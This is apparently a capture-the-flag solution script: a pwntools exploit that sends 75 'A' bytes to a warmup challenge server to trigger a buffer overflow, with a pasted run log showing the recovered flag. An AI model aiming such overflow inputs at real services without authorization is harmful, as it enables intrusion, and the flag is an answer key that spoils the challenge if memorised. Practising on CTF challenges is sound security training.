from pwn import *

URL=''
p = remote(URL, 42752)

context.log_level="debug"

p.sendline(b"A"*64 + b"A"*8 + b"A"*3)

p.interactive()

"""
$ python3 warmup.py
[+] Opening connection to challs.dunhack.me on port 42752: Done
[DEBUG] Sent 0x4c bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[*] Switching to interactive mode
[DEBUG] Received 0x31 bytes:
    b"Reach Mt. Stupid's summit and retrieve the flag!\n"
Reach Mt. Stupid's summit and retrieve the flag!
[DEBUG] Received 0x40 bytes:
    b'Where would you like to climb to?: ACSI{dUnn1ng_kRU6Er_WaS_h3R3}'
Where would you like to climb to?: ACSI{dUnn1ng_kRU6Er_WaS_h3R3}[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to challs.dunhack.me port 42752
"""
